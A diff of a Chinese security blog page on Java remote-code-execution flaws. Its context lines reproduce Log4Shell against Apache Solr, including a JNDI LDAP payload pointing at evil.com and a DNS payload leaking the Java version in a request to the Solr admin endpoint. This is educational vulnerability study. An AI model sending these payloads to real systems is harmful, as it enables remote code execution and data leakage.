@@ -31,7 +31,7 @@
 <meta property="og:description" content="本文记录Java高危高频利用的RCE漏洞基本原理、利用条件及方法..">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-04-06T14:39:13.000Z">
-<meta property="article:modified_time" content="2022-09-21T14:49:17.128Z">
+<meta property="article:modified_time" content="2022-09-21T14:52:14.293Z">
 <meta property="article:author" content="L0n9w4y">
 <meta property="article:tag" content="Execution">
 <meta property="article:tag" content="Vulnerability">
@@ -436,7 +436,7 @@ Content-Length: 160
 <p>Apache Log4j2是一款Java日志框架。2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于<code>$&#123;jndi:ldap://evil.com/example&#125;</code>的lookup用于进行JNDI注入，执行任意代码</p>
 <p><strong>漏洞复现</strong></p>
 <p>通过使用了这个库的应用来复现这个漏洞，比如Apache Solr，启动一个Apache Solr 8.11.0，依赖了Log4j 2.14.1</p>
-<p>服务启动后，访问<a href="http://target-ip:8983即可查看到Apache">http://target-ip:8983即可查看到Apache</a> Solr的后台页面</p>
+<p>服务启动后，访问 <a target="_blank" rel="noopener" href="http://target-ip:8983/">http://target-ip:8983</a> 即可查看到Apache Solr的后台页面</p>
 <p><code>$&#123;jndi:dns://$&#123;sys:java.version&#125;.example.com&#125;</code>是利用JNDI发送DNS请求的Payload，将其作为管理员接口的action参数值发送如下数据包</p>
 <pre class="language-none"><code class="language-none">GET &#x2F;solr&#x2F;admin&#x2F;cores?action&#x3D;$&#123;jndi:ldap:&#x2F;&#x2F;$&#123;sys:java.version&#125;.example.com&#125; HTTP&#x2F;1.1
 Host: target-ip:8983
